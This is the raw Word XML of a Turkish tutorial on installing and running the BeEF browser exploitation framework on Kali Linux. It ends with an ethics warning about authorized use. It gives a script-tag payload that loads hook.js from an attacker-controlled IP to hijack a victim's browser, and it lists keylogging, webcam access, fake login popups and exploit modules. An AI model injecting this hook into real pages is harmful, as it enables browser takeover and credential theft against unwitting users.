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320C" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="KonuBal"/>
      </w:pPr>
      <w:r>
        <w:t>BeEF (Browser Exploitation Framework)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4823D225" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>BeEF Nedir?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2141C2D7" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:r>
        <w:t>BeEF (The Browser Exploitation Framework), özellikle istemci taraflı saldırılara odaklanan açık kaynaklı bir sızma testi aracıdır. Tarayıcılar üzerinden hedef sistemlerle etkileşime geçerek zafiyetleri sömürmek için kullanılır. BeEF; siber güvenlik testlerinde, web güvenlik araştırmalarında ve sosyal mühendislik saldırılarında yaygın olarak tercih edilir.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72DC6D12" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>BeEF Ne İşe Yarar?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D5149DF" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListeMaddemi"/>
      </w:pPr>
      <w:r>
        <w:t>Tarayıcıları 'hook' ederek hedef sistemde komut çalıştırma.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="028BAD15" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListeMaddemi"/>
      </w:pPr>
      <w:r>
        <w:t>JavaScript ve web teknolojileri ile zafiyet tespiti.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="437BB387" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListeMaddemi"/>
      </w:pPr>
      <w:r>
        <w:t>Sosyal mühendislik saldırıları (sahte giriş ekranları, pop-up mesajlar).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA32506" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListeMaddemi"/>
      </w:pPr>
      <w:r>
        <w:t>Ağ içi bilgi toplama ve tarayıcı üzerinden port tarama.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CD04600" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListeMaddemi"/>
      </w:pPr>
      <w:r>
        <w:t>Kimlik bilgisi toplama (credential harvesting).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1A3A5B" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>Kali Linux Üzerinde BeEF Kurulumu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="123D6C0F" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:r>
        <w:t>1. Sistem Güncellemesi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59673B5D" w14:textId="77777777" w:rsidR="005366F3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sudo apt update &amp;&amp; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> apt upgrade -y</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="243E358C" w14:textId="40AAD5B1" w:rsidR="00390C38" w:rsidRDefault="00390C38">
      <w:r w:rsidRPr="00390C38">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="74D4BEAA" wp14:editId="3A401FD3">
            <wp:extent cx="3610479" cy="666843"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="1958019993" name="Resim 1" descr="yazı tipi, ekran görüntüsü, grafik, grafik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9993" name="Resim 1" descr="yazı tipi, ekran görüntüsü, grafik, grafik tasar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364D" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:r>
        <w:t>2. BeEF Kurulumu:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF907CE" w14:textId="77777777" w:rsidR="005366F3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sudo apt install beef-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>xss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> -y</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222F3709" w14:textId="521D6148" w:rsidR="00390C38" w:rsidRDefault="00390C38">
      <w:r w:rsidRPr="00390C38">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4C29DF1F" wp14:editId="223320D3">
            <wp:extent cx="2819794" cy="647790"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="573386523" name="Resim 1" descr="yazı tipi, grafik, ekran görüntüsü, grafik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86523" name="Resim 1" descr="yazı tipi, grafik, ekran görüntüsü, grafik tasar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4FE4" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:r>
        <w:t>3. Yapılandırma Dosyasını Düzenleme (Opsiyonel):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DEA070" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:p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sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> nano /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/beef-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>xss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config.yaml</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="362D6D4A" w14:textId="3FAA96F2" w:rsidR="00390C38" w:rsidRDefault="00390C38">
      <w:r w:rsidRPr="00390C38">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0E6DA679" wp14:editId="29357AC7">
            <wp:extent cx="3391373" cy="714475"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="1561680025" name="Resim 1" descr="yazı tipi, ekran görüntüsü, grafik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80025" name="Resim 1" descr="yazı tipi, ekran görüntüsü, grafik, tasar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D4E2" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>BeEF Nasıl Başlatılır?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="499CC708" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:r>
        <w:t>BeEF’i başlatmak için terminale şu komutu girin:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E8C4B29" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:p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sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> beef-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>xss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1AF0642F" w14:textId="60CF7A15" w:rsidR="00390C38" w:rsidRDefault="00390C38">
      <w:r w:rsidRPr="00390C38">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="128B50DF" wp14:editId="6EB1CCF7">
            <wp:extent cx="2229161" cy="714475"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="813756298" name="Resim 1" descr="ekran görüntüsü, yazı tipi, grafik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6298" name="Resim 1" descr="ekran görüntüsü, yazı tipi, grafik, metin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21CA" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Servis başladıktan sonra genelde şu bilgiler görünür:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4318F735" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Panel URL: http://127.0.0.1:3000/ui/panel</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Kullanıcı adı/şifre: (genelde beef / beef)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Hook.js URL: http://127.0.0.1:3000/hook.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FD08844" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>Tarayıcıyı Hook Etme</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E0874A3" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Hook.js dosyasını bir web sayfasına ekleyerek veya sosyal mühendislik yöntemleriyle kullanıcıyı bu scripti çalıştırmaya ikna ederek tarayıcıyı 'hook' edebilirsiniz:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556F8C8C" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;script src="http://YOUR-IP:3000/hook.js"&gt;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="336FB01A" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>BeEF Paneli Üzerinden Yapılabilecekler</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC395BB" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListeMaddemi"/>
      </w:pPr>
      <w:r>
        <w:t>Alert, prompt, keylogger, webcam erişimi (tarayıcı izin verirse).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1054214B" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListeMaddemi"/>
      </w:pPr>
      <w:r>
        <w:t>Ağ tarama (internal IP aralıklarında).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068E057A" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListeMaddemi"/>
      </w:pPr>
      <w:r>
        <w:t>Tarayıcı hakkında detaylı bilgi toplama.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1174DAE3" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListeMaddemi"/>
      </w:pPr>
      <w:r>
        <w:t>Sosyal mühendislik modülleri (fake update, login popup).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFDE778" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListeMaddemi"/>
      </w:pPr>
      <w:r>
        <w:t>Exploit modülleri (CVE içerikleri).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09A5B87E" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>⚠️ Güvenlik ve Etik Uyarı</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A381B5" w14:textId="77777777" w:rsidR="005366F3" w:rsidRDefault="00000000">
      <w:r>
        <w:t>BeEF yalnızca izinli test ortamlarında ve etik sızma testlerinde kullanılmalıdır. Habersiz kullanım yasal suç teşkil edebilir. Test ettiğiniz sistemin sahibi tarafından açık izin almanız gerekmektedir.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="005366F3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490710">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1036589953">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="374235041">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="213009280">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1316453016">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="168107447">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1171943028">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="997731350">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="121924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C38"/>
    <w:rsid w:val="004609B7"/>
    <w:rsid w:val="005366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AEBC3"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{07596BA7-EC30-41B2-A837-229B10EB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2025-07-31T12:12:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>